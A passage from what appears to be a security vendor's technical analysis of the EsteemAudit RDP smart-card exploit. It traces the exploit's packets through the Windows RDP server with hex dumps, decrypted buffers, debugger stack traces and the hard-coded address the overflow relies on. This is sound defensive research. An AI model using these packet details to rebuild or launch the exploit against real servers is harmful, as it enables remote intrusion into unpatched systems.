<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_16.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31840" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_16.png" alt="esteemaudit_16" width="865" height="708" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_16.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_16-300x246.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_16-768x629.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_16-370x303.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 15 The build_exploit_x86 function assmploying the exploit buffer.</em></p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_17.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31816" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_17.png" alt="esteemaudit_17" width="865" height="1004" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_17.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_17-258x300.png 258w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_17-768x891.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_17-370x429.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 16 The exploit buffer in a live pcap.</em></p>
<p>We can extract the data for the exploit buffer the same way we did for the overflow buffer.</p>
<table style="height: 779px;" width="709">
<tbody>
<tr>
<td width="415">encrypted</p>
<p>038e9d83  0d76b81e 51331ed0 b3b4b29d ba4a1aaa  ..v&#8230;3Q&#8230;&#8230;J.</p>
<p>038e9d93  ad0b26e1 c15daa1e 20079871 a18afe91  .&amp;&#8230;.].q.. &#8230;.</p>
<p>038e9da3  46d26828 a8883de7 8b54718e 33ebf243  (h.F.=&#8230;qT.C..3</p>
<p>038e9db3  9d3d556b f8a4f6f8 4a29500c 5d06bd19  kU=&#8230;&#8230;P)J&#8230;]</p>
<p>038e9dc3  e6099604 4bc7dc66 92103b5e 6da27faa  &#8230;.f..K^;&#8230;..m</p>
<p>038e9dd3  07420e27 c95b5664 79d50284 f7bbd1d3  &#8216;.B.dV[&#8230;.y&#8230;.</p>
<p>038e9de3  79c389e1 f795e1cf bcb35b4d 69d0ef0c  &#8230;y&#8230;.M[&#8230;..i</p>
<p>038e9df3  92beeadf 9010b061 763848d5 bc032358  &#8230;.a&#8230;.H8vX#..</p>
<p>…</p>
<p>&nbsp;</p>
<p>Decrypted</p>
<p>038e9d83  00000204 00000003 49434472 00000000  &#8230;&#8230;..rDCI&#8230;.</p>
<p>038e9d93  00000001 00000000 000001f0 00081001  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>038e9da3  cccccccc 000001d0 00000000 00000000  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>038e9db3  00000000 000001c0 00000001 000001c0  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>038e9dc3  ada0d86e 08011e7a 0801118e 08005e85  n&#8230;z&#8230;&#8230;..^..</p>
<p>038e9dd3  0800bedd 11111111 2a6bd248 972dc73e  &#8230;&#8230;..H.k*&gt;.-.</p>
<p>038e9de3  00000000 6431e6f0 08011fef 08019078  &#8230;&#8230;1d&#8230;.x&#8230;</p>
<p>038e9df3  abc45491 22222222 00000000 316f482f  .T..&#8221;&#8221;&#8221;&#8221;&#8230;./Ho1</p>
<p>…</td>
</tr>
</tbody>
</table>
<p>The exploit buffer packet is also a Device Control Response (DR_CONTROL_RSP) with the kind set to DR_DEVICE_IOCOMPLETION (0x49434472). This is the same as the overflow buffer described earlier.</p>
<p>The final two packets of the first stage are the Select_MF and End Response messages, respectively. We only show the decrypted data here.</p>
<table>
<tbody>
<tr>
<td width="415">len</p>
<p>0178cf98  0000004c                             L&#8230;</p>
<p>&nbsp;</p>
<p>plain</p>
<p>038ead9b  00000044 00000003 49434472 00000000  D&#8230;&#8230;.rDCI&#8230;.</p>
<p>038eadab  00000001 00000000 00000030 00081001  &#8230;&#8230;..0&#8230;&#8230;.</p>
<p>038eadbb  cccccccc 00000010 00000000 00000000  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>038eadcb  00000000 00000002 00000001 00000002  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>038eaddb  00000090 00000000 00000000</p>
<p>&nbsp;</p>
<p>&nbsp;</td>
</tr>
</tbody>
</table>
<p>The length of pExtraBytes is two. Two two extra bytes “90 00” will be processed by smart card module on the Server.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a9a8ee479963864" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
len
0178cf98  0000003c</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a9a8ee479963864-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a9a8ee479963864-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a9a8ee479963864-1"><span class="crayon-i">len</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a9a8ee479963864-2"><span class="crayon-cn">0178cf98</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">0000003c</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The length of pExtraBytes is 0, it is just an end response. This completes the traffic from EsteemAudit, next we’ll go into how the server processes this data.</p>
<h3>RDP Server</h3>
<p>With the details on what the client send to the server and the protocol in the encrypted packet out of the way, we can start looking at how the server processes the packet and where the vulnerability is exploited.</p>
<h3>Kernel Layer</h3>
<p>As described in the Architecture and Component section, we know that the kernel component is responsible for receiving the RDP data. We need to identify the data entry point function that handles the RAW data sent from the client to the server.</p>
<p>Look at the two stack traces below. It directly shows the execution flows when a DEVICE_IO packet arrives. Termdd is the core dispatcher, RDPWD is responsible for MCS stack ad we can get the raw data sent by client from RDPWD!MCSIcaRawInput. The next several functions parsed data layer by layer according to the RDP protocol described earlier.</p>
<table style="height: 1546px;" width="629">
<tbody>
<tr>
<td width="415">kd&gt; k</p>
<p># ChildEBP RetAddr</p>
<p>00 baf3b32c f6e134ef rdpdr!DrExchangeManager::RecognizePacket+0x8</p>
<p>01 baf3b350 f6e12e34 rdpdr!DrSession::ReadCompletion+0x95</p>
<p>02 baf3b368 8081d741 rdpdr!DrSession::ReadCompletionRoutine+0x38</p>
<p>03 baf3b398 f76895d8 nt!IopfCompleteRequest+0xcd</p>
<p>04 baf3b3d4 f768a0d2 termdd!IcaChannelInputInternal+0x1f0</p>
<p>05 baf3b3fc ba1a26e1 termdd!IcaChannelInput+0x3c</p>
<p>06 baf3b430 ba19c3c1 RDPWD!WDW_OnDataReceived+0x181</p>
<p>07 baf3b458 ba19c1b9 RDPWD!SM_MCSSendDataCallback+0x159</p>
<p>08 baf3b4c0 ba19bfe0 RDPWD!HandleAllSendDataPDUs+0x155</p>
<p>09 baf3b4dc ba1b9ba4 RDPWD!RecognizeMCSFrame+0x32</p>
<p>0a baf3b504 ba19b06b RDPWD!MCSIcaRawInputWorker+0x346</p>
<p>0b baf3b52c f768d194 RDPWD!MCSIcaRawInput+0x65</p>
<p>0c baf3b550 baa92fcb termdd!IcaRawInput+0x58</p>
<p>0d baf3bd90 f768c265 TDTCP!TdInputThread+0x371</p>
<p>0e baf3bdac 809418f4 termdd!_IcaDriverThread+0x4d</p>
<p>0f baf3bddc 80887f4a nt!PspSystemThreadStartup+0x2e</p>
<p>10 00000000 00000000 nt!KiThreadStartup+0x16</p>
<p>&nbsp;</p>
<p>kd&gt; k</p>
<p># ChildEBP RetAddr</p>
<p>00 f5a8b254 f6e14f22 rdpdr!RxLowIoCompletion+0x3a</p>
<p>01 f5a8b260 f6e15291 rdpdr!DrDevice::CompleteRxContext+0x2a</p>
<p>02 f5a8b284 f6e158b0 rdpdr!DrDevice::CompleteBusyExchange+0x4d</p>
<p>03 f5a8b2cc f6e164b2 rdpdr!DrDevice::OnDeviceControlCompletion+0x116</p>
<p>04 f5a8b2f0 f6e1269d rdpdr!DrDevice::OnDeviceIoCompletion+0x1ee</p>
<p>05 f5a8b310 f6e1285a rdpdr!DrExchangeManager::OnDeviceIoCompletion+0x55</p>
<p>06 f5a8b324 f6e1351f rdpdr!DrExchangeManager::HandlePacket+0x26</p>
<p>07 f5a8b350 f6e12e34 rdpdr!DrSession::ReadCompletion+0xc5</p>
<p>08 f5a8b368 8081d741 rdpdr!DrSession::ReadCompletionRoutine+0x38</p>
<p>09 f5a8b398 f76c95d8 nt!IopfCompleteRequest+0xcd</p>
<p>0a f5a8b3d4 f76ca0d2 termdd!IcaChannelInputInternal+0x1f0</p>
<p>0b f5a8b3fc f53856e1 termdd!IcaChannelInput+0x3c</p>
<p>0c f5a8b430 f537f3c1 RDPWD!WDW_OnDataReceived+0x181</p>
<p>0d f5a8b458 f537f1b9 RDPWD!SM_MCSSendDataCallback+0x159</p>
<p>0e f5a8b4c0 f537efe0 RDPWD!HandleAllSendDataPDUs+0x155</p>
<p>0f f5a8b4dc f539cba4 RDPWD!RecognizeMCSFrame+0x32</p>
<p>10 f5a8b504 f537e06b RDPWD!MCSIcaRawInputWorker+0x346</p>
<p>11 f5a8b52c f76cd194 RDPWD!MCSIcaRawInput+0x65</p>
<p>12 f5a8b550 f55b2fcb termdd!IcaRawInput+0x58</p>
<p>13 f5a8bd90 f76cc265 TDTCP!TdInputThread+0x371</p>
<p>14 f5a8bdac 809418f4 termdd!_IcaDriverThread+0x4d</p>
<p>15 f5a8bddc 80887f4a nt!PspSystemThreadStartup+0x2e</p>
<p>16 00000000 00000000 nt!KiThreadStartup+0x16</td>
</tr>
</tbody>
</table>
<p>We can see the content of srcBuf through the comment from IDA pro when RDPWD!MCSIcaRawInputWorker call RDPWD!RecognizeMCSFrame.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_18.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31792" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_18.png" alt="esteemaudit_18" width="865" height="121" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_18.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_18-300x42.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_18-768x107.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_18-370x52.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 17 Content of srcBuf</em></p>
<p>We can also see how RDPWD!RecognizeMCSFrame decodes PER.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_19.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31768" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_19.png" alt="esteemaudit_19" width="865" height="236" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_19.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_19-300x82.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_19-768x210.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_19-370x101.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 18 RDPWD!RecognizeMCSFrame decodes PER-encoded MCS Domain PDU</em></p>
<p>After parsing the MCS stack, RDPWD will parse the TS_DATA_INFO part. The data in TS_DATA_INFO is encrypted so the SM_MCSSendDataCallback function calls SMDecryptPacket-&gt; DecryptData-&gt;rc4 to decrypt the data first.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_20.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31744" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_20.png" alt="esteemaudit_20" width="865" height="199" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_20.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_20-300x69.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_20-768x177.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_20-370x85.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 19 Decrypting the TS_DATA_INFO data</em></p>
<p>For those who want to recreated this, you can also set breakpoint in RDPWD!rc4 function which is a similar implementation with libeay32 like we did in the client to see encrypted and decrypted data on the server.</p>
<p>Next, the SM_MCSSendDataCallback function calls WDW_OnDataReceived will handle the decrypted data.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_21.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31720" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_21.png" alt="esteemaudit_21" width="865" height="149" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_21.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_21-300x52.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_21-768x132.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_21-370x64.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 20 WDW_OnDataReceived Function Call</em></p>
<p>After this, the function calls termdd!IcaChannelInput to dispatch decrypted data to different channels. In this example, the buffer overflow packet sent by EsteemAudit is the Device IO packet which is a part of File System Virtual Channel Extension and will be parsed by RDPDR module.</p>
<p>We can find the DR_DEVICE_IOCOMPLETION [MS-RDPEFS.pdf] header in the decrypted buffer overflow packet.</p>
<table style="height: 173px;" width="791">
<tbody>
<tr>
<td width="415">000000f4 -&gt;CodePage</p>
<p>00000003 -&gt;Flags</p>
<p>Device Control Response (DR_CONTROL_RSP)</p>
<p>-&gt;DeviceIoReply (16 bytes): DR_DEVICE_IOCOMPLETION</p>
<p>4472 -&gt;RDPDR_CTYP_CORE 0x4472</p>
<p>4943 -&gt;PAKID_CORE_DEVICE_IOCOMPLETION 0x4943</td>
</tr>
</tbody>
</table>
<p>In RDPDR module, we can see there is vtable call to recognize the packet and then handle the packet.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_22.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31696" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_22.png" alt="esteemaudit_22" width="865" height="203" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_22.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_22-300x70.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_22-768x180.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_22-370x87.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 21 RDPDR Module Handling the packet</em></p>
<p>If the server receives a packet marked as RDPDR_HEADER, RecognizePacket with the appropriate class is called.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_23.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31672" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_23.png" alt="esteemaudit_23" width="609" height="78" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_23.png 609w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_23-300x38.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_23-370x47.png 370w" sizes="(max-width: 609px) 100vw, 609px" /></a></p>
<p><em>Figure 22 RecognizePacket called for RDPDR_HEADER</em></p>
<p>The buffer overflow and exploit packets sent by EsteemAudit have the 0x49434472 flag set. 0x4472 is used for the Device redirector core component and 0x4943 is used for Device I/O response.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_24.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31648" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_24.png" alt="esteemaudit_24" width="865" height="104" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_24.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_24-300x36.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_24-768x92.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_24-370x44.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_25.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31624" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_25.png" alt="esteemaudit_25" width="858" height="65" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_25.png 858w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_25-300x23.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_25-768x58.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_25-370x28.png 370w" sizes="(max-width: 858px) 100vw, 858px" /></a></p>
<p><em>Figure 23 Packet Type Flags from [MS-RDPESP]</em></p>
<p>After recognizing the packet type, rdpdr!DrSession::ReadCompletion calls HandlePacket to parse the packet. We can see OnDeviceControlCompletion will deal with the header.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_26.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31600" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_26.png" alt="esteemaudit_26" width="777" height="383" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_26.png 777w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_26-300x148.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_26-768x379.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_26-370x182.png 370w" sizes="(max-width: 777px) 100vw, 777px" /></a></p>
<p><em>Figure 24 Continued Parsing of the RDP Packet</em></p>
<p>After handling the packet, we can see rdpdr!DrDevice::CompleteRxContext be notified via I/O that we have processed the packet and we can exchange the context. Other modules are also notified and continue to process the left part of the packet, here is pbExtraBytes buffer.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_27.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31576" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_27.png" alt="esteemaudit_27" width="865" height="155" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_27.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_27-300x54.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_27-768x138.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_27-370x66.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 25 CompleteRxContext Notified of the Processed Packet</em></p>
<h3>User Land Layer</h3>
<p>In user land, winlogon.exe calls the smart card modules, like gpkcsp, scredir, and winscard to communicate with the client.</p>
<p>First, we can investigate the stack trace below. It is a stack trace of copying the pbExtraBytes sent by the client from the kernel to the user land. We see the data sent by client flow into the user land on the server.</p>
<table style="height: 1078px;" width="726">
<tbody>
<tr>
<td width="415">0:003&gt; k</p>
<p>ChildEBP RetAddr</p>
<p>00fce058 5cd45619 scredir!_CopyReturnToCallerBuffer</p>
<p>00fce104 723642b0 scredir!SCardTransmit+0x194</p>
<p>00fce180 08005c32 WinSCard!SCardTransmit+0x76</p>
<p>00fce1b0 0800921d gpkcsp!DoSCardTransmit+0x3d</p>
<p>00fce41c 0800e2dd gpkcsp!WriteTimestamps+0x679</p>
<p>00fcf39c 08004acb gpkcsp!MyCPAcquireContext+0x817</p>
<p>00fcf708 77f50909 gpkcsp!CPAcquireContext+0x26e</p>
<p>00fcf7cc 77f50a5f ADVAPI32!CryptAcquireContextA+0x55f</p>
<p>00fcf834 0103fd78 ADVAPI32!CryptAcquireContextW+0xa4</p>
<p>00fcf864 0104086c winlogon!CSCLogonInit::CryptCtx+0x75</p>
<p>00fcf874 010408c1 winlogon!CSCLogonInit::RelinquishCryptCtx+0x10</p>
<p>00fcf898 0103a8f5 winlogon!ScHelperGetCertFromLogonInfo+0x22</p>
<p>00fcf8bc 77c50193 winlogon!s_RPC_ScHelperGetCertFromLogonInfo+0x3f</p>
<p>00fcf8e0 77cb33e1 RPCRT4!Invoke+0x30</p>
<p>00fcfce0 77cb35c4 RPCRT4!NdrStubCall2+0x299</p>
<p>00fcfcfc 77c4ff7a RPCRT4!NdrServerCall2+0x19</p>
<p>00fcfd30 77c7e732 RPCRT4!DispatchToStubInCNoAvrf+0x38</p>
<p>00fcfd48 77c5042d RPCRT4!DispatchToStubInCAvrf+0x14</p>
<p>00fcfd9c 77c50353 RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x11f</p>
<p>00fcfdc0 77c511dc RPCRT4!RPC_INTERFACE::DispatchToStub+0xa3</p>
<p>00fcfdfc 77c512f0 RPCRT4!LRPC_SCALL::DealWithRequestMessage+0x42c</p>
<p>00fcfe20 77c58678 RPCRT4!LRPC_ADDRESS::DealWithLRPCRequest+0x127</p>
<p>00fcff84 77c58792 RPCRT4!LRPC_ADDRESS::ReceiveLotsaCalls+0x430</p>
<p>00fcff8c 77c5872d RPCRT4!RecvLotsaCallsWrapper+0xd</p>
<p>00fcffac 77c4b110 RPCRT4!BaseCachedThreadRoutine+0x9d</p>
<p>00fcffb8 7c824829 RPCRT4!ThreadStartRoutine+0x1b</p>
<p>WARNING: Stack unwind information not available. Following frames may be wrong.</p>
<p>00fcffec 00000000 kernel32!GetModuleHandleA+0xdf</td>
</tr>
</tbody>
</table>
<p>The most important function in user land on the server is gpkcsp!MyCPAcquireContext. It is responsible for sending, receiving and processing smart card packets, and it corresponds to the RecvProcessSendPackets function of EsteemAudit.</p>
<p>Before we start introduce this function, let’s look at scredir!SCardTransmit. This function is called by gpkcsp!DoSCardTransmit and it is a basic unit for sending and receiving the smart card information.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_28.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31552" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_28.png" alt="esteemaudit_28" width="865" height="667" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_28.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_28-300x231.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_28-768x592.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_28-370x285.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 26 scredir!SCardTransmit Function</em></p>
<p>We that the 1<sup>st</sup> argument to _SendSCardIOCTL, 0x900d0, represents SCARD_IOCTL_TRANSMIT, and the data structure of the send and receive buffer fallows _Transmit_Call and _Transmit_Return structure described earlier. After getting the data from the kernel, Transmit_Return_Decode will decode and process the data. Pay attention to scredir!_CopyReturnToCallerBuffer function, <strong>it will copy the data sent by client to a global variable 0x080190d8 in data section</strong>. This means that the data in buffer overflow packet and in exploit packet will be copied to the address 0x080190d8. That’s why an absolute address 0x080190dc is hardcoded in buffer overflow packet.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_29.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31528" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_29.png" alt="esteemaudit_29" width="865" height="210" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_29.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_29-300x73.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_29-768x186.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_29-370x90.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/25_2.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-32224" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/25_2.png" alt="25_2" width="865" height="492" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/25_2.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/25_2-300x171.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/25_2-768x437.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/25_2-370x210.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p>&nbsp;</p>
<p><em>Figure 27 Data from the Overflow and Exploit Packets are copied to 0x080190d8.</em></p>
<p>Now we can introduce the gpkcsp!MyCPAcquireContext function and the whole exploit process. The details for SCardEstablishContext and ConnectToCard are not shown here, but we will introduce what happened when the data in buffer overflow packet arrived.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_31.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31480" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_31.png" alt="esteemaudit_31" width="865" height="278" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_31.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_31-300x96.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_31-768x247.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_31-370x119.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p>Figure 28 gpkcsp!MyCPAcquireContext Function</p>
<p>There is global variable named ProvCont which stores a 0x24a8 sized heap address.</p>
<table style="height: 1382px;" width="586">
<tbody>
<tr>
<td width="415">0:003&gt; dc gpkcsp!ProvCont (08176dd8)</p>
<p>08176dd8  02cdcb58                             X&#8230;</p>
<p>&nbsp;</p>
<p>0:003&gt; !heap -p -a 0x2cdcb58</p>
<p>address 02cdcb58 found in</p>
<p>_DPH_HEAP_ROOT @ 3a1000</p>
<p>in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize &#8211;         VirtAddr         VirtSize)</p>
<p>3a3c80:          2cdcb58             24a8 &#8211;          2cdc000             4000</p>
<p>7c96d97a ntdll!RtlAllocateHeap+0x00000e9f</p>
<p>77b8d08c msvcrt!malloc+0x0000006c</p>
<p>08012599 gpkcsp!GMEM_Alloc+0x0000000e</p>
<p>0800a937 gpkcsp!DllMain+0x00000090</p>
<p>080120fc gpkcsp!_DllMainCRTStartup+0x00000052</p>
<p>7c94a352 ntdll!LdrpCallInitRoutine+0x00000014</p>
